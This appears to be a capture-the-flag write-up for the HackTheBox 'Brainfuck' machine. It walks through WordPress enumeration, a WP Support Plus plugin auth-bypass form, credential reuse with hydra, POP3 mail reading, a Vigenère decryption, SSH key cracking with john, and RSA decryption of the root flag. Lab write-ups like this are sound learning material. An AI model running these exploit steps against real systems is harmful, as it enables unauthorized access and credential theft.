# BRAINFUCK

## NMAP

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/brainfuck]
└─$ nmap 10.10.10.17 -p 22,25,110,143,443 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-31 12:25 EDT
Nmap scan report for brainfuck.htb (10.10.10.17)
Host is up (0.17s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: UIDL SASL(PLAIN) RESP-CODES USER CAPA AUTH-RESP-CODE TOP PIPELINING
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: more have SASL-IR post-login LITERAL+ ID OK capabilities AUTH=PLAINA0001 IDLE Pre-login IMAP4rev1 listed LOGIN-REFERRALS ENABLE
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title: Brainfuck Ltd. &#8211; Just another WordPress site
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are 5 open ports and 2 domains `brainfuck.htb` , `sup3rs3cr3t.brainfuck.htb` 
Adding the 2 domains to `/etc/hosts` file


## Brainfuck Ltd.

'https://brainfuck.htb/'

![](https://github.com/Leo-2807/Writeups/blob/main/images/brainfuck2.png)

There are two things that we find on this webpage 

> This is a wordpress website

> SMTP is working as we previously saw through nmap scan but here we find a email address which may also provide us with a username 

`orestis@brainfuck.htb`


## WORDPRESS


On doing a quick google search I find that `wpscan` is a pre installed tool on kali which can do wordpress enumerations

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/brainfuck]
└─$ wpscan --url https://brainfuck.htb/ --disable-tls-checks                                                      4 ⨯
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://brainfuck.htb/ [10.10.10.17]
[+] Started: Wed Sep  1 07:00:04 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.10.0 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://brainfuck.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://brainfuck.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://brainfuck.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).
 | Found By: Rss Generator (Passive Detection)
 |  - https://brainfuck.htb/?feed=rss2, <generator>https://wordpress.org/?v=4.7.3</generator>
 |  - https://brainfuck.htb/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.7.3</generator>

[+] WordPress theme in use: proficient
 | Location: https://brainfuck.htb/wp-content/themes/proficient/
 | Last Updated: 2021-08-28T00:00:00.000Z
 | Readme: https://brainfuck.htb/wp-content/themes/proficient/readme.txt
 | [!] The version is out of date, the latest version is 3.0.52
 | Style URL: https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3
 | Style Name: Proficient
 | Description: Proficient is a Multipurpose WordPress theme with lots of powerful features, instantly giving a prof...
 | Author: Specia
 | Author URI: https://speciatheme.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3, Match: 'Version: 1.0.6'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] wp-support-plus-responsive-ticket-system
 | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
 | Last Updated: 2019-09-03T07:57:00.000Z
 | [!] The version is out of date, the latest version is 9.1.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 7.1.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt

 [+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <==============> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] administrator
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

So now we have the wordpress version `WordPress version 4.7.3 ` , the theme `WordPress theme in use: proficient` and the plugin ` wp-support-plus-responsive-ticket-system`
We also found two users `admin and administrator`

## WORDPRESS EXPLOIT 

I tried to search for exploits for all three of these. After some failed attempts I found a exploit for the plugin which worked

`WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalat | php/webapps/41006.txt`

![](https://github.com/Leo-2807/Writeups/blob/main/images/brainfuck3.png)

I copy the html form to a new file and edit it to make it wotk.

```php
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
	Username: <input type="text" name="username" value="admin">
	<input type="hidden" name="email" value="orestis@brainfuck.htb">
	<input type="hidden" name="action" value="loginGuestFacebook">
	<input type="submit" value="Login">
</form>
```

Start a http server on our machine

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/brainfuck/wordpress]
└─$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```
Now open the form on your web browser

![]([https://github.com/Leo-2807/Writeups/blob/main/images/brainfuck4.png)

![](https://github.com/Leo-2807/Writeups/blob/main/images/brainfuck5.png)

And it worked!

![](https://github.com/Leo-2807/Writeups/blob/main/images/brainfuck6.png)

## SMTP CREDENTIALS

While looking through the website I found smtp creds filled in 

![](https://github.com/Leo-2807/Writeups/blob/main/images/brainfuck7.png)

But the password was not visible so I used `Inspect Element` option 

![](https://github.com/Leo-2807/Writeups/blob/main/images/brainfuck8.png)

`user=orestis & password="kHGuERB29DNiNE"`

So now that I have creds I used hydra to check if they worked for the services we have on this machine 
I tried ssh and smtp first but they didn't work so I tried pop3 which is port 110 and it worked

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/brainfuck/wordpress]
└─$ hydra -l orestis -p kHGuERB29DNiNE  10.10.10.17 pop3 -V
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-01 08:59:44
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking pop3://10.10.10.17:110/
[ATTEMPT] target 10.10.10.17 - login "orestis" - pass "kHGuERB29DNiNE" - 1 of 1 [child 0] (0/0)
[110][pop3] host: 10.10.10.17   login: orestis   password: kHGuERB29DNiNE
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-01 08:59:46
```

## POP3

So connected to port 110 using telnet and logged in through 
I found two messages, one of which contains the creds for the `super secret forum`

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/brainfuck]
└─$ telnet 10.10.10.17 110                                                              1 ⨯
Trying 10.10.10.17...
Connected to 10.10.10.17.
Escape character is '^]'.
+OK Dovecot ready.
USER orestis
+OK
PASS kHGuERB29DNiNE
+OK Logged in.
STAT
+OK 2 1491
LIST
+OK 2 messages:
1 977
2 514
.
RETR 1
+OK 977 octets
Return-Path: <www-data@brainfuck.htb>
X-Original-To: orestis@brainfuck.htb
Delivered-To: orestis@brainfuck.htb
Received: by brainfuck (Postfix, from userid 33)
        id 7150023B32; Mon, 17 Apr 2017 20:15:40 +0300 (EEST)
To: orestis@brainfuck.htb
Subject: New WordPress Site
X-PHP-Originating-Script: 33:class-phpmailer.php
Date: Mon, 17 Apr 2017 17:15:40 +0000
From: WordPress <wordpress@brainfuck.htb>
Message-ID: <00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb>
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8

Your new WordPress site has been successfully set up at:

https://brainfuck.htb

You can log in to the administrator account with the following information:

Username: admin
Password: The password you chose during the install.
Log in here: https://brainfuck.htb/wp-login.php

We hope you enjoy your new site. Thanks!

--The WordPress Team
https://wordpress.org/
.
RETR 2
+OK 514 octets
Return-Path: <root@brainfuck.htb>
X-Original-To: orestis
Delivered-To: orestis@brainfuck.htb
Received: by brainfuck (Postfix, from userid 0)
        id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
To: orestis@brainfuck.htb
Subject: Forum Access Details
Message-Id: <20170429101206.4227420AEB@brainfuck>
Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
From: root@brainfuck.htb (root)

Hi there, your credentials for our "secret" forum are below :)

username: orestis
password: kIEnnfEKJ#9UmdO

Regards
```
## SUPER SECRET FORUM

'https://sup3rs3cr3t.brainfuck.htb/'

![](https://github.com/Leo-2807/Writeups/blob/main/images/brainfuck1.png)

Logging in with the creds

![](https://github.com/Leo-2807/Writeups/blob/main/images/brainfuck9.png)

Now I open the ssh thread

![](https://github.com/Leo-2807/Writeups/blob/main/images/brainfuck10.png)

So we can get the ssh key in the encrypted thread which is key

![](https://github.com/Leo-2807/Writeups/blob/main/images/brainfuck11.png)

## DECRYPTING

On first glance it looked like `vignere cipher` to me 

For vignere cipher we need a key for that I picked the encoded url 
because we already know the first five letters are going to be `https`

I use [Cyber Chef](https://gchq.github.io/CyberChef/) to decrypt the messages

Putting https as key gives us the beginning of the real key 

![](https://github.com/Leo-2807/Writeups/blob/main/images/brainfuck12.png)

The name of the box is `brainfuck` and the key starts with `fuckm` so I guessed the rest of the key  `fuckmybrain`

using this key we decrypt the messages

```bash
Hey give me the url for my key bitch :)

Orestis - Hacking for fun and profit

Say please and i just might do so...

Pleeeease....

Orestis - Hacking for fun and profit

There you go you stupid fuck, I hope you remember your key password because I dont :)

https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa

No problem, I'll brute force it ;)

Orestis - Hacking for fun and profit
```

## SSH KEY

I download the key from the given url

Then I used john to find the passphrase

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/brainfuck]
└─$ python3 ../ssh2john.py id_rsa >> id_rsa.hash
                                                                                            
┌──(kali㉿kali)-[~/Downloads/hackthebox/brainfuck]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
3poulakia!       (id_rsa)
1g 0:00:00:04 DONE (2021-09-01 09:56) 0.2247g/s 3222Kp/s 3222Kc/s 3222KC/sa6_123..heartbleedbelievethehype
Session completed
```

## USER.TXT

After giving the ssh key required permission we can ssh into the machine
and get the user flag

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/brainfuck]
└─$ ssh -i id_rsa orestis@10.10.10.17              
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


You have mail.
Last login: Wed May  3 19:46:00 2017 from 10.10.11.4
orestis@brainfuck:~$ whoami
orestis
orestis@brainfuck:~$ ls
debug.txt  encrypt.sage  mail  output.txt  user.txt
orestis@brainfuck:~$ cat user.txt
2c11cfbc5b959f73ac15a3310bd097c9
```

## ROOT.TXT

While looking at the files in the home directory of orestis I find this python script

```bash
orestis@brainfuck:~$ cat encrypt.sage 
nbits = 1024

password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))

p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)



c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')
```

So to read root.txt we need to decrypt `enc_pass` 
By looking at the code I can tell that this is rsa encryption 
So I open Python3 on my machine and decrypt the text 

```bash
┌──(kali㉿kali)-[~]
└─$ python3
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> p=7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
>>> q=7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
>>> e=30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
>>> ct=44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
>>> phi=(p-1)*(q-1)
>>> d=pow(e,-1,phi)
>>> n=p*q
>>> m=pow(ct,d,n)
>>> from Crypto.Util.number import long_to_bytes
>>> print(long_to_bytes(m))
b'6efc1a5dbb8904751ce6566a305bb8ef'
```

